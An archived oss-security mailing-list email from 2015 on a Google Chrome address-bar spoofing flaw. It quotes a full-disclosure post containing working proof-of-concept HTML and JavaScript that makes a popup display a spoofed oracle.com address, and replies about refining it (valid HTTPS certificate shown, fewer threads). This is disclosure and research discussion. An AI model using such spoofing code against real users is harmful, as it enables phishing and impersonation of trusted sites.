X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3286" "Friday" "3" "July" "2015" "12:37:23" "+0700" "anidear" "anidear1@gmail.com" "<CAJUayPnQqiOFvW6nDHGXCM0JNVDSOasYJ=JNXWWvb6Yq=+1cZw@mail.gmail.com>" "96" "Re: [oss-security] Re: [FD] Google Chrome Address Spoofing (Request For Comment)" nil nil nil "7" "2015070305:37:23" "[oss-security] Re: [FD] Google Chrome Address Spoofing (Request For Comment)" (number mark "        anidear1@gma Jul  3   96/3286  " thread-indent "\"Re: [oss-security] Re: [FD] Google Chrome Address Spoofing (Request For Comment)\"\n") "<55954b06.8504710a.a940f.fffffb6dSMTPIN_ADDED_MISSING@mx.google.com>" ("<55954b06.8504710a.a940f.fffffb6dSMTPIN_ADDED_MISSING@mx.google.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 25962 invoked by uid 550); 3 Jul 2015 05:58:07 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 13776 invoked from network); 3 Jul 2015 05:37:54 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:sender:in-reply-to:references:from:date:message-id
         :subject:to:cc:content-type;
        bh=y01oJe4jtoIbRBS1halLeqOzjg/J+o3BvnHwig8XSO0=;
        b=wV1RWrIsKAPnI5ynzrKaM7U2qemIAYoZ6zy9Op8fqAfvIWUFbfscAfUsRB+tR4uhYt
         FDyW2v5YFuAXeJYGpz02FPKf8o1YAkY4NFc+nfFAGx2C7Vu60skryX0B5ImU0dNAyd3B
         07zFEdlltDw+GhsDAUKXitCQgofEGkMU2yKlZ7qGQFXAobKJ7eN7EAW1rodyl71M50Y6
         6CS6AAHsJ7D4QAS1d/bf5AqYo4DATAdhY56KKbpoudBg6P9BEkjwrE6W8uxes0Hh2Yxk
         +PkRhpd6LwVujCpH9WI3CGteWY0jY7yb/vGArdUzcsvkL5/h9aWLhOGGXwJn+WPG08uN
         5ldQ==
X-Received: by 10.182.87.69 with SMTP id v5mr30443520obz.37.1435901862698;
 Thu, 02 Jul 2015 22:37:42 -0700 (PDT)
MIME-Version: 1.0
In-Reply-To: <55954b06.8504710a.a940f.fffffb6dSMTPIN_ADDED_MISSING@mx.google.com>
References: <55954b06.8504710a.a940f.fffffb6dSMTPIN_ADDED_MISSING@mx.google.com>
X-Google-Sender-Auth: rl2TxD4_GZSfyR9ns7BMuWJVY7s
Message-ID: <CAJUayPnQqiOFvW6nDHGXCM0JNVDSOasYJ=JNXWWvb6Yq=+1cZw@mail.gmail.com>
Content-Type: multipart/alternative; boundary=089e013cb8327565ad0519f1f490
Cc: David Leo <david.leo@deusen.co.uk>, bugtraq@securityfocus.com, 
	fulldisclosure@seclists.org
Date: Fri, 3 Jul 2015 12:37:23 +0700
From: anidear <anidear1@gmail.com>
Reply-To: oss-security@lists.openwall.com
Sender: ptantiku@gmail.com
Subject: Re: [oss-security] Re: [FD] Google Chrome Address Spoofing (Request
 For Comment)
To: oss-security@lists.openwall.com

--089e013cb8327565ad0519f1f490
Content-Type: text/plain; charset=UTF-8

I played around with the code to see if can change it to avoid using the
fork bomb. Here's what I came up with
https://gist.github.com/ptantiku/d37c364cd13bb31a1ee6
It seems to need at least 500 threads to update the URL at 5ms for this to
work (tested on Chrome x64 43.0.2357.130, Linux, locally).
And the first setInterval() can be substituted for setTimeout(...,10) which
will run only once for waiting the pop-up window to open.

Although the browser is not crashed, the window is still unresponsive to
allow user to interact with it.
Wondering if there is a way to fix that.

Cheers,
PT

On Thu, Jul 2, 2015 at 8:33 PM, Mustafa Al-Bassam <mus@musalbas.com> wrote:

> That's pretty neat. Played around with this and made a few discoveries.
>
> 1. It shows a valid certificate when you spoof HTTPS sites. That's really
> bad. POC/screenshot: https://github.com/musalbas/address-spoofing-poc
>
> 2. The page isn't responsive when using this flaw. That means you can't
> spoof a login box for example. (I tried.)
>
> 3. The success of the exploit seems to depend on if the browser can start
> loading content.html fast enough. I noticed that the exploit works 100% of
> the time when used locally. Perhaps a better version of the exploit would
> somehow preload content.html - for example by opening a window with an URL
> that starts with javascript: followed by a script to display the content?
> That, or perhaps reducing the interval time for trying to run next() after
> the popup is created.
>
> I wonder if this works on any other browsers?
>
> MustafaOn 30 Jun 2015 7:08 am, David Leo <david.leo@deusen.co.uk> wrote:
> >
> > Impact:
> > The "click to verify" thing is completely broken...
> > Anyone can be "BBB Accredited Business" etc.
> > You can make whitehouse.gov display "We love Islamic State" :-)
> >
> > Note:
> > No user interaction on the fake page.
> >
> > Code:
> > ***** index.html
> > <script>
> > function next()
> > {
> > w.location.replace('http://www.oracle.com/index.html?'+n);n++;
> > setTimeout("next();",15);
> > setTimeout("next();",25);
> > }
> > function f()
> > {
> > w=window.open("content.html","_blank","width=500 height=500");
> >
> i=setInterval("try{x=w.location.href;}catch(e){clearInterval(i);n=0;next();}",5);
> > }
> > </script>
> > <a href="#" onclick="f()">Go</a><br>
> > ***** content.html
> > <b>This web page is NOT oracle.com</b>
> > <script>location="http://www.oracle.com/index.html";</script>
> > ***** It's online
> > http://www.deusen.co.uk/items/gwhere.6128645971389012/
> > (The page says "June/16/2015" - it works as we tested today)
> >
> > Request For Comment:
> > We reported this to Google.
> > They reproduced, and say
> > It's DoS which doesn't matter.
> > We think it's very strange,
> > since the browser does not crash(not DoS),
> > and the threat is obvious.
> > What's your opinion?
> >
> > Kind Regards,
> >
> > PS
> > We love clever tricks.
> > We love this:
> > http://dieyu.org/
> >
> >
> > _______________________________________________
> > Sent through the Full Disclosure mailing list
> > https://nmap.org/mailman/listinfo/fulldisclosure
> > Web Archives & RSS: http://seclists.org/fulldisclosure/
>

--089e013cb8327565ad0519f1f490--
